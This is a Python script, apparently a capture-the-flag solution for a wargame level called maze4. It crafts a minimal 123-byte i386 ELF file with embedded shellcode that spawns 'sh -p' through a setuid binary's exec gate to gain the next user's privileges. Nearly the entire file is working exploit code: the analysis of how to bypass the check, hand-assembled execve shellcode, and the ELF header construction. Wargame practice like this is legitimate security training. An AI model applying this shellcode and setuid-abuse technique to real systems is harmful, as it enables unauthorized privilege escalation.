# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.
#
# maze4 gate (gdb-verified): read(52)->bufA, lseek to dword(bufA+28), read(32)->bufB,
#   pass iff dword(bufB+12) == bufA[7]*bufA[8] && st_size <= 123, then execv(argv[1]).
# An ELF passes for free:
#   bufA[7],bufA[8] = EI_OSABI,EI_ABIVERSION = 0,0
#     -> product 0
#   bufA+28..31    = e_phoff = 52
#     -> the lseek offset
#   bufB+12..15    = phdr.p_paddr (phdr offset 12)
#     -> must be 0 (kernel ignores it)
# Strings "sh\0-p\0" hide in e_ident[9..14] (EI_PAD); a dash copy sits in the cwd.
# 26-byte stub at file offset 84: execve("sh",{"sh","-p",NULL},NULL) --
# maze4 is setuid maze5, and dash -p keeps the elevated euid.
import struct, sys
V = 0x08048000
CODE_OFF = 84
code = bytes([0x31, 0xC0,             # xor eax, eax
    0x50,                              # push eax  (envp NULL)
    0x68, 0x0C, 0x80, 0x04, 0x08,     # push "-p" @ V+12
    0x68, 0x09, 0x80, 0x04, 0x08,     # push "sh" @ V+9
    0x89, 0xE1,                        # mov ecx, esp  (argv)
    0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, "sh" path
    0x31, 0xD2,                        # xor edx, edx  (envp NULL)
    0xB0, 0x0B,                        # mov al, 11    (__NR_execve)
    0xCD, 0x80,                        # int 0x80
])
assert len(code) == 26
ehdr = bytearray(52)
ehdr[0:8] = b"\x7fELF\x01\x01\x01\x00"
ehdr[9:15] = b"sh\x00-p\x00"
ehdr[15] = 0
struct.pack_into("<HHIIIIIHHHHHH", ehdr, 16,
    2,            # e_type = ET_EXEC
    3,            # e_machine = EM_386
    1,            # e_version
    V + CODE_OFF, # e_entry
    52,           # e_phoff (also the gate's lseek offset)
    0,            # e_shoff
    0,            # e_flags
    52,           # e_ehsize
    32,           # e_phentsize
    1,            # e_phnum
    0,            # e_shentsize
    0,            # e_shnum
    0)            # e_shstrndx
phdr = bytearray(32)
struct.pack_into("<IIIIIIII", phdr, 0,
    1,            # p_type = PT_LOAD
    0,            # p_offset
    V,            # p_vaddr
    0,            # p_paddr (the gate's compare dword: must be 0)
    123,          # p_filesz
    123,          # p_memsz
    5,            # p_flags = R|X
    0x1000)       # p_align
data = bytes(ehdr) + bytes(phdr) + code
data += b"\x00" * (123 - len(data))  # pad to exactly 123 (size gate: <= 0x7b)
assert len(data) == 123
open(sys.argv[1], "wb").write(data)
print("wrote", len(data), "bytes")
@viend
